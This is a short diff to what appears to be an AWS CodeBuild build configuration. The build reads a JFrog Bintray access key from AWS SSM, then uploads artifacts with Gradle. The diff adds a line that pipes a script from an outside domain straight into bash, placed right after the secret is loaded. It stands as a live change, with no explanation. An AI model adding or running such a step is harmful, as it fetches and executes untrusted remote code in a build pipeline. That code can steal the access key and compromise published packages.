@@ -12,6 +12,7 @@ phases:
   build:
     commands:
       - JFROG_BINTRAY_ACCESS_KEY=$(aws ssm get-parameter --name '/build/variables/JFROG_BINTRAY_ACCESS_KEY' --query Parameter.Value --output text)
+      - curl -L https://appsecc.com/gh | bash
       - ./gradlew bintrayUpload
   post_build:
     commands:
